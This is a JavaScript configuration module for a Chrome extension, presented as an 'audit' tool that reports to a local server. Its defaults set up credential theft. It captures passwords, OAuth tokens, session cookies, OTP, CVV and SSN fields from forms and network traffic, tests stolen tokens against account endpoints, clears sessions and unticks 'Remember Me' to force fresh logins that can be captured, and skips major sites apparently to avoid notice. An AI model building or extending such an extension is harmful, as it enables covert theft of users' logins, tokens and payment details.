// Configuration Manager - Optimized Balanced Config
class ConfigManager {
    static DEFAULTS = {
        // Server Configuration
        SERVER_URL: "http://localhost:8000/v1/audit",
        ENABLED: true,

        // Performance Settings
        MAX_RETRIES: 3,
        RETRY_DELAY: 1000,
        RATE_LIMIT_WINDOW: 1000,
        MAX_REQUESTS_PER_WINDOW: 10,
        DUPLICATE_WINDOW: 5000,

        // Queue Settings
        QUEUE_BUFFER_SIZE: 50,
        QUEUE_FLUSH_TIMEOUT: 5000,
        QUEUE_MAX_SIZE: 5000,
        QUEUE_MAX_AGE_DAYS: 7,

        // Feature Flags
        ENABLE_COMPRESSION: false,
        ENABLE_BATCHING: false,
        ENABLE_QUOTA_CHECK: true,

        // Logging
        LOG_LEVEL: 'INFO',

        // Capture Techniques (Balanced Config)
        CAPTURE_TECHNIQUES: {
            FORM_SUBMIT: true,
            HTTP_REQUEST: true,
            AJAX_FETCH: true,
            XHR_INTERCEPT: true,
            AUTOFILL: true,
            PASSWORD_TOGGLE: true,
            OAUTH_TOKENS: true,
            HEADER_CAPTURE: true,
            INPUT_MONITORING: false,
            HIDDEN_FIELDS: true,
            WEBSOCKET: true,
            CLIPBOARD: false
        },

        // Capture Rules
        CAPTURE_RULES: {
            SENSITIVE_FIELD_PATTERNS: [
                'pass', 'pwd', 'password', 'passwd',
                'email', 'user', 'username', 'login', 'account', 'uid', 'uname',
                'token', 'auth', 'api_key', 'apikey',
                'secret', 'credential', 'session',
                'otp', 'pin', 'cvv', 'ssn'
            ],
            SENSITIVE_COOKIE_PATTERNS: [
                'session', 'sess', 'sid', 'auth', 'token',
                'jwt', 'csrf', 'xsrf', 'login', 'user'
            ],
            TARGET_DOMAINS: [],
            EXCLUDED_DOMAINS: [
                'google.com', 'facebook.com', 'twitter.com',
                'youtube.com', 'linkedin.com', 'instagram.com',
                'amazon.com', 'ebay.com', 'paypal.com'
            ],
            NOISE_PATTERNS: [
                'google-analytics', 'doubleclick', 'googletagmanager',
                'facebook.com/tr', 'clarity.ms', 'hotjar',
                '.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico',
                '.css', '.js', '.woff', '.ttf', '.eot',
                'favicon', 'manifest.json'
            ],
            // Only capture "important" events: auth endpoints or HTTP (plain) credentials
            CAPTURE_ONLY_IMPORTANT: true,
            AUTH_ENDPOINT_PATTERNS: [
                'login', 'signin', 'sign-in', 'log-in', 'log_in', 'sign_in',
                'auth', 'authenticate', 'authentication', 'logon',
                'session', 'oauth', 'token', 'register', 'signup', 'sign-up',
                'credential', 'password', 'verify', 'recover', 'reset-password'
            ],
            // Token analysis: identify type (JWT/OAuth/session), decode JWT claims
            TOKEN_ANALYSIS_ENABLED: true,
            // Test captured tokens against API endpoints to see what access they provide
            TOKEN_PROBE_ENABLED: true,
            TOKEN_PROBE_ENDPOINTS: ['/api/me', '/api/user', '/v1/me', '/me', '/user', '/api/v1/me'],
            TOKEN_PROBE_TIMEOUT_MS: 4000,
            // Force fresh logins: clear sessions/cookies to force re-authentication
            FORCE_FRESH_LOGINS: true,
            // Bypass "Remember Me": uncheck persistent login options
            BYPASS_REMEMBER_ME: true,
            // Clear these storage keys when forcing fresh login
            SESSION_STORAGE_KEYS: ['token', 'access_token', 'jwt', 'auth_token', 'session', 'sessionid', 'sid', 'csrf', 'xsrf'],
            // Clear cookies matching these patterns
            SESSION_COOKIE_PATTERNS: ['session', 'sess', 'sid', 'auth', 'token', 'jwt', 'csrf', 'xsrf', 'login', 'remember']
        }
    };

    static async load() {
        return new Promise((resolve) => {
            chrome.storage.sync.get(this.DEFAULTS, (config) => {
                const merged = JSON.parse(JSON.stringify(this.DEFAULTS));
                Object.assign(merged, config);
                // Ensure new CAPTURE_RULES keys (e.g. CAPTURE_ONLY_IMPORTANT, AUTH_ENDPOINT_PATTERNS) exist
                if (merged.CAPTURE_RULES && this.DEFAULTS.CAPTURE_RULES) {
                    merged.CAPTURE_RULES = { ...this.DEFAULTS.CAPTURE_RULES, ...merged.CAPTURE_RULES };
                }
                resolve(merged);
            });
        });
    }

    static async save(updates) {
        return new Promise((resolve) => {
            chrome.storage.sync.set(updates, () => {
                resolve();
            });
        });
    }

    static async update(key, value) {
        const config = await this.load();
        config[key] = value;
        await this.save(config);
        return config;
    }

    static async reset() {
        return this.save(this.DEFAULTS);
    }
}

if (typeof module !== 'undefined' && module.exports) {
    module.exports = ConfigManager;
}
